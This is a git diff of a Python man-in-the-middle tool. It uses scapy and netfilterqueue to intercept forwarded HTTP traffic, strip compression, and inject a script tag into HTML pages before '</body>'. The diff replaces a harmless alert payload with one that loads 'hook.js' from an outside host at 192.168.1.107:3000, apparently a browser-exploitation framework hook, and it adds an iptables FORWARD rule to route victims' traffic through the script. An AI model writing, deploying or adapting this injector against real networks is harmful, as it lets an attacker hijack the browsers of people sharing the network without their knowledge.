@@ -5,43 +5,55 @@ from subprocess import call
 import scapy.all as scapy
 from re import sub, search
 
-code_inject = b"<script>alert('hello')</script>"
+code_length = len('<script src="http://192.168.1.107:3000/hook.js"></script>')
+code_inject = b'<script src="http://192.168.1.107:3000/hook.js"></script>'
+
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
 
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
 
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[scapy.TCP].dport == 10000:
             # REQUEST
             # change the encode for plain text
             modified_load = sub(b'Accept-Encoding:.*?\\r\\n',
                                 b'', scapy_packet[scapy.Raw].load)
+            modified_load = modified_load.replace('HTTP/1.1', 'HTTP/1.0')
             scapy_packet[scapy.Raw].load = modified_load
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.TCP].chksum
             packet.set_payload(bytes(scapy_packet))
 
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 10000:
             # RESPONSE
-            index = scapy_packet[scapy.Raw].load.find(b'</body>')
-            content_lenght = search("(?:Content-Lenght:\s)(\d*)", str(scapy_packet[scapy.Raw].load))
-            
-            if content_lenght and b"text/html" in scapy_packet[scapy.Raw].load:
-                modified_content_lenght = int(content_lenght.group(1)) + len(code_inject)
-                scapy_packet[scapy.Raw].load.replace(content_lenght.group(1), str(modified_content_lenght))
+            load = scapy_packet[scapy.Raw].load
+            load = load.replace(b"</body>", code_inject + b"</body>")
+            content_length = search(b"(?:Content-Length:\s)(\d*)", load)
 
-            if index != -1:
-                modified_load = scapy_packet[scapy.Raw].load[:index] + \
-                    code_inject + scapy_packet[scapy.Raw].load[index:]
-                scapy_packet[scapy.Raw].load = modified_load
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                print(f"\nModified load: {colored(scapy_packet[scapy.Raw].load, 'blue')}")
-                packet.set_payload(bytes(scapy_packet))
+            if content_length and b"text/html" in load:
+
+                modified_content_length = int(
+                    content_length.group(1).decode()) + code_length
+                result = load.replace(content_length.group(
+                    1), str(modified_content_length).encode())
+                load = result
+
+            if load != scapy_packet[scapy.Raw].load:
+                new_packet = set_load(scapy_packet, load)
+                print(
+                    f"\nModified load: {colored(new_packet[scapy.Raw].load, 'blue')}")
+                packet.set_payload(bytes(new_packet))
                 print(f"{colored('[*]', 'green')} Load Done")
+
     packet.accept()
 
 
@@ -53,8 +65,8 @@ def check_sudo():
 
 
 check_sudo()
-call('iptables -I INPUT -j NFQUEUE --queue-num 1', shell=True)
-call('iptables -I OUTPUT -j NFQUEUE --queue-num 1', shell=True)
+call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
+
 queue = nfq.NetfilterQueue()
 
 queue.bind(1, process_packet)
@@ -63,5 +75,4 @@ try:
     queue.run()
 except KeyboardInterrupt:
     print(f"\n{colored('[!]', 'red')} Exit")
-    call('iptables -D INPUT -j NFQUEUE --queue-num 1', shell=True)
-    call('iptables -D OUTPUT -j NFQUEUE --queue-num 1', shell=True)
+    call('iptables -D FORWARD -j NFQUEUE --queue-num 0', shell=True)
